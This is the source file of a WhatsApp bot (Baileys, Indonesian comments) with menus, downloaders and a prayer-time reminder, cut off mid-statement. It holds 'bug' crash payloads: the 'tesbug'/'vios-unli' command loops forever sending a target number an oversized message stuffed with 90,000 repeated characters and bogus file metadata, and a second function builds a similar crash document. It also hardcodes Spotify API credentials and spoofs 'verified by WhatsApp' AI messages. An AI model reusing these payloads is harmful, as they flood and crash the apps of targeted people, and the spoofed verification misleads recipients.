// BASE CREATE BY RUZTANXD 
/* JANGAN DI HPS HARGAI GOBLOK

• APA BILAH KEHAPUS CREDITS MAKA DI ANGGAP DOSA BESAR 

# RuztanXD Bukan Sepuh ataupun Pengocok jandal RuztanXD cuma mau di anggap ada:) */


require("../setting/settings")
const welcome = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const filePath = './blacklist.json'; // Path file
 const path = './all/database/jpm_text.json';
module.exports = async (RuzXD, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

//========= CONFIGURASI ==========//
const budy = (typeof m.text == 'string' ? m.text : '')
const isOwner = [global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const prefix = '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { Client } = require('ssh2');
const ytdl = require('@vreden/youtube_scraper');
const { Sticker } = require('wa-sticker-formatter');
const fsx = require("fs-extra")
const { generateMessageIDV2, proto, getContentType, generateWAMessage } = require('@whiskeysockets/baileys');
const jam = moment.tz('Asia/Makassar').format('HH:mm:ss')
const LINODE_API_TOKEN = global.apilinode;
const API_TOKEN = global.apitokendo;
const makeid = randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await RuzXD.decodeJid(RuzXD.user.id)
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const sender = m.key.fromMe ? (RuzXD.user.id.split(':')[0]+'@s.whatsapp.net' || RuzXD.user.id) : (m.key.participant || m.key.remoteJid)
const groupMetadata = m.isGroup ? await RuzXD.groupMetadata(m.chat).catch(e => {}) : {}
let participant_bot = m.isGroup ? groupMetadata?.participants.find((v) => v.id == botNumber) : {}
let participant_sender = m.isGroup ? groupMetadata?.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture, getBuffer, fetchJson, resize } = require('../all/function.js')
const { ssweb, igstalk, tts, remini, mediafire, ytmp3 } = require("../scrape/screaper.js")
const { fetchJKT48Members } = require('../scrape/scrapejkt48.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("../all/converter.js")
//const ytdl = require('../scrape/ytdl'); // Im
const b = fs.readFileSync("./media/menu.mp3")
const pler = JSON.parse(fs.readFileSync('./all/database/ruzgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
//const isPremium = premium.includes(m.sender)*/
const { checkApproval, approveScript, isApproved, validateApprovalData, checkScriptIntegrity } = require('../all/security/adiwajs')
const config = require('../all/security/adiwConfig')
async function main() {
    if (!(await isApproved())) {
        if (m.sender.includes(config.approval.num) && budy.includes(config.approval.text)) {
            await approveScript(m.sender, RuzXD.authState.creds.pairingCode);
            await reply(config.approval.greet);
        } else {
            await checkApproval();
        }
    }
}
const dbPath = './database/database.json'; 
function readDatabase() {
    try {
        const data = fs.readFileSync(dbPath, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        return { users: {} };
    }
}
function writeDatabase(data) {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2), 'utf8');
}

let db = readDatabase(); 
    if (!db.users[sender]) {
        db.users[sender] = { status_deposit: false }; 
        writeDatabase(db);
//        console.log(`Pengguna baru ditambahkan: ${sender}`);
    }
    if (db.users[sender].status_deposit) {
        return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    }
    
const yt1s = {
  dl: async (link) => {
    try {
      const { data } = await axios.post('https://yt1s.io/api/ajaxSearch', 
        new URLSearchParams({ p: 'home', q: link, w: '', lang: 'en' }),
        {
          headers: {
            'User-Agent': 'Postify/1.0.0',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          },
        }
      );
      
      if (data.status !== 'ok') throw new Error('Kagak ada response dari Api nya 🥴');
      const $ = cheerio.load(data.data);
      return $('a.abutton.is-success.is-fullwidth.btn-premium')
        .map((_, el) => ({
          title: $(el).attr('title'),
          url: $(el).attr('href'),
        }))
        .get();
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
};
      
//database
//const AntiSpam = db.data.antispam
/////////////////////////////////////////////////////////////////////////
async function searchSpotifyTracks(query) {
  const clientId = 'acc6302297e040aeb6e4ac1fbdfd62c3';
  const clientSecret = '0e8439a1280a43aba9a5bc0a16f3f009';
  const auth = Buffer.from(`${clientId}:${clientSecret}`).toString('base64');

  const getToken = async () => {
    const response = await fetch('https://accounts.spotify.com/api/token', {
      method: 'POST',
      timeout: 60000, // 60 seconds
      body: new URLSearchParams({ grant_type: 'client_credentials' }),
      headers: { Authorization: `Basic ${auth}` },
    });
    return (await response.json()).access_token;
  };

  const accessToken = await getToken();
  const offset = 10;
  const searchUrl = `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&offset=${offset}`;
  const response = await fetch(searchUrl, {
    headers: { Authorization: `Bearer ${accessToken}` },
  });
  const data = await response.json();
  return data.tracks.items;
}
async function uploadToCatbox(filePath) {
            const form = new FormData();
            form.append('fileToUpload', fs.createReadStream(filePath)); // file yang diupload
            form.append('reqtype', 'fileupload'); // reqtype harus "fileupload"
          
            try {
              const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                  ...form.getHeaders(),
                },
              });
          
              if (response.data) {
                // Ambil hanya nama file yang diunggah
                const filename = response.data.trim();
                return `${filename}`;
              } else {
                throw new Error('Gagal mendapatkan URL dari Catbox.');
              }
            } catch (error) {
              console.error('Error uploading to Catbox:', error.message);
              throw error;
            }
          }
          
main();
if (!await isApproved() && isCmd) {
    return;
}
checkScriptIntegrity();
if (await isApproved()) {
    validateApprovalData(RuzXD.authState.creds.pairingCode);
}
if (!fs.existsSync('./all/approval')) {
RuzXD.sendMessage(config.approval.num + '@s.whatsapp.net', { text: 'Connect lost!\nHarap Mendapatkan persetujuan dari *RuztanXD*' })
fs.writeFileSync('./all/approval', '', 'utf8');
}
//=========== MESSAGE ===========//
/*if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namaowner), color(`[ PESAN ]`, `cyan`), color(`\nFROM`, `blue`), color(`${senderNumber}`, `cyan`), color(`Text :`, `blue`), color(`🗣️ ${cmd}`, `white`))
}*/
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namaowner), color(`[ PESAN ]`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 FROM`, `blue`), color(`${senderNumber}`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 TEXT :`), color(`🗣️ ${cmd}`, `cyan`), chalk.yellow.bgCyan.bold(`\n乂 WAKTU :`), color(`${jam}`, `cyan`), color(`\n---------------------------`, `green`))
}

RuzXD.autoshalat = RuzXD.autoshalat ? RuzXD.autoshalat : {}
    let id = m.chat
    if (id in RuzXD.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        RuzXD.autoshalat[id] = [
            RuzXD.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./media/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
    async function heranibos(Target, Ptpc = false) {
let textnya = "⚡𝐇𝐚𝐫𝐥𝐞𝐲 𝐁𝐚𝐧𝐭𝐚𝐢 𝐊𝐞𝐫𝐨𝐜𝐨" + "ꦾ".repeat(90000) + "@6289507493483".repeat(50000);
await RuzXD.relayMessage(Target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "Drayy",
fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
contactVcard: true,
jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
},
hasMediaAttachment: true
},
body: {
text: textnya
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: ["6289507493483@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
fileName: "Bokep 18+",
fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1724474503",
contactVcard: true,
thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "https://files.catbox.moe/uk38k6.jpg"
}
}
}
}
}
}
}, Ptpc ? {
participant: {
jid: Target,
quoted: m
}
} : {});
console.log(chalk.yellow.bold("Harley Send Bug To " + Target));
}
async function bakdok(target, heranibos) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: heranibos });
await RuzXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//========= FAKE QUOTED =========//
//Reply
async function reply(txt) {
const Shikimori = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: namabot,
newsletterJid: `${global.idsaluran}`,
},
externalAdReply: {  
showAdAttribution: true,
title: `${namabot}`,
body: 'Subscribe My YouTube',
thumbnailUrl: `${imgreply}`,
sourceUrl: 'https://www.youtube.com/@ruztanxd',
},
},
text: txt,
}
return RuzXD.sendMessage(m.chat, Shikimori, {
quoted: m,
})
}
const qtext2 = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "@ RuztanXD" }}}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Terimakasih telah order"}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `RuztanXD`,jpegThumbnail: ""}}}

const qaudio = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {audioMessage: {seconds: 900030, ptt: true }}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285824689238:+62 858-2468-9238\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const qpayment = {
key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "IDR", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "RuztanXD"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "INR"}}}}

//========== FUNCTION ===========//
var ppuser
try {
ppuser = await RuzXD.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}


let example = (teks) => {
return `*Contoh Cara Command :*\nketik *${cmd}* ${teks}`
}


function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
function loadJPMConfig() {
    try {
        if (fs.existsSync(path)) {
            const data = fs.readFileSync(path, 'utf8');
            return JSON.parse(data);
        }
    } catch (err) {
        console.error('Gagal membaca konfigurasi JPM dari file:', err);
    }
    return { teks: '', stokJPM: 0 };
}
function saveJPMConfig(config) {
    try {
        fs.writeFileSync(path, JSON.stringify(config), 'utf8');
    } catch (err) {
        console.error('Gagal menyimpan konfigurasi JPM ke file:', err);
    }
}

let { tekss, stokJPM } = loadJPMConfig(); 
let isJPMRunning = false;

function pickRandom(list) {
return list[Math.floor(list.length * Math.random())]
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
let blacklist = [];
try {
    const data = fs.readFileSync(filePath, 'utf-8');
    blacklist = JSON.parse(data); 
} catch (err) {
    console.error('Gagal membaca file blacklist.json:', err.message);
    blacklist = []; 
}
//const { proto, getContentType, generateWAMessage } = require('baileys')

m.replyAI = async(teks) => {
  const stanza = [{ attrs: { biz_bot: '1' }, tag: "bot" }, { attrs: {}, tag: "biz" }];
  const G = await generateWAMessage(m.chat, { text: teks }, { quoted: {
    key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
    message: { conversation: "_Shikimori Terverifikasi Oleh WhatsApp_" }
  }})
  await RuzXD.sendPresenceUpdate('composing', m.chat)
  return RuzXD.relayMessage(m.chat, G.message, { additionalNodes: stanza });
}
async function replyAI(jid, teks) {
const { randomBytes } = require('crypto')
const stanza = [];
stanza.push({
    attrs: {
        biz_bot: '1'
    },
    tag: "bot"
});
stanza.push({
    attrs: {},
    tag: "biz"
});
const gen = {
    conversation: teks,
    messageContextInfo: {
        messageSecret: randomBytes(32),
        supportPayload: "{\"version\": 1, \"is_ai_message\": true, \"should_show_system_message\": true, \"ticket_id\": \"1669945700536053\"}"
    }
};

await RuzXD.relayMessage(jid, gen, { 
    messageId: generateMessageIDV2(RuzXD.user.id), 
    additionalNodes: stanza 
});
}
async function toIDR(x) {
x = x.toString()
var pattern = /(-?\d+)(\d{3})/
while (pattern.test(x))
x = x.replace(pattern, "$1.$2")
return x
}
async function totalfiturr() {
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./setting/RuztanXD.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
   const fitur2 = () =>{
            var mytext = fs.readFileSync("./setting/RuztanXD.js").toString()
            var numUpper = (mytext.match(/case "/g) || []).length
            return numUpper
        }


 valvul = `${fitur1()} + ${fitur2()}`
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = valvul
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(valvul)
let resulto = (new Function('return ' + valvul))()
if (!resulto) throw resulto
return resulto
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
const totalfitur = await totalfiturr()
let mruz = "`"
/*case 'totalfintur': 
 case 'totalcmd': 
 case 'totalcommand': 
reply(`${totalfitur}`)
break*/
switch (command) {
case 'tesbug': case 'vios-unli': {
//if (!jangann) return m.reply('gaje')
if (!q) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
await m.reply("Di proses, Matiin aja bot nya kalo ada firasat di ban")
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await heranibos(target)
    await sleep(1200)
   
  }
}
break

case "menu":{
let menu = `
╭──❉ *Menu Utama* ❉───
- tebakmenu
- toolsmenu
- aimenu
- searchmenu
- downloadmenu
- ownermenu
- grupmenu
- panelmenu
- buymenu
╰──❉ *${namabot}* ❉───
`
await RuzXD.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Shikimori Asistent`,
            mimetype: "application/pdf",
            fileLength: 99999999,
            pageCount: 2024, caption: menu,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	newsletterName: "Shikimori asisstent ",
		newsletterJid: global.idsaluran,
		},
		externalAdReply: {  
title: `© Shikimori Asistent`, 
body: '',
thumbnailUrl: thumb,
sourceUrl: global.sgc, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: qkontak})
RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true,
    viewOnce: false,
    }, { quoted: m})
    }
break
case "buymenu":{
let menu = `
乂 L I S T  M E N U 乂
- buypanel
- buyvps
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "panelmenu":{
let menu = `
乂 L I S T  M E N U 乂
- cpanel1
- cpanel
- cadmin
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "cpanel":{
let menu = `.1gb username\n.2gb username\n.3gb username\n.4gb username\n.5gb username\n.6gb username\n.7gb username\n.8gb username\n.9gb username\n.10gb username\n.unli username
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "cpanel1":{
let menu = `.cp1gb username\n.cp2gb username\n.cp3gb username\n.cp4gb username\n.cp5gb username\n.cp6gb username\n.cp7gb username\n.cp8gb username\n.cp9gb username\n.cp10gb username\n.cpunli username
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "searchmenu":{
let menu = `
乂 S E A R C H  M E N U 乂
- spotify
- pin
- ttstalk
- vtuber
- anilist
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "downloadmenu":{
let menu = `
乂 D O W N  M E N U 乂
- gdrive
- igmp4
- tiktok
- tt2
- play
- igdl
- fbdown
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break

case "aimenu":{
let menu = `
乂 A I  M E N U 乂
- turbo
- txt2img
- morphic
- luminai
- luminai1 (khusus privat chat)
- metaai (khusus privat chat)
- dukun
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "ownermenu":{
let menu = `
乂 O W N  M E N U 乂
- payment
- pushkontak (grup terbuka)
- pushkontakvip (grup terbuka)
- pushkontak1 (grup tutup)
- pushkontak2 (grup tutup)
- jpmtesti
- jpm
- jpm2
- jpm3
- autojpm
- done
- addbl
- unbl
- listbl
- cvps
- deldroplet
- addgc
- delgc
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
    audio: fs.readFileSync('./media/menu.mp3'),
    mimetype: 'audio/mpeg',
    ptt: true,
    viewOnce: false,
}, { quoted: qkontak });
}
break
case "tebakmmenu":{
let menu = `
乂 T E B A K  M E N U 乂
- tebakjkt48
- jawab 
- bantuan
`
await RuzXD.sendMessage(m.chat, {
    video: fs.readFileSync('./media/Menu.mp4'),
    caption: menu,
    gifPlayback: true,
    contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterName: "Shikimori Asistent",
            newsletterJid: global.idsaluran,
        },
        externalAdReply: {  
            title: `© Shikimori Asistent`, 
            body: '',
            thumbnailUrl: thumb,
            sourceUrl: global.sgc, 
            mediaType: 1,
            renderLargerThumbnail: true
        }
    }
}, { quoted: qkontak });
await RuzXD.sendMessage(m.chat, {
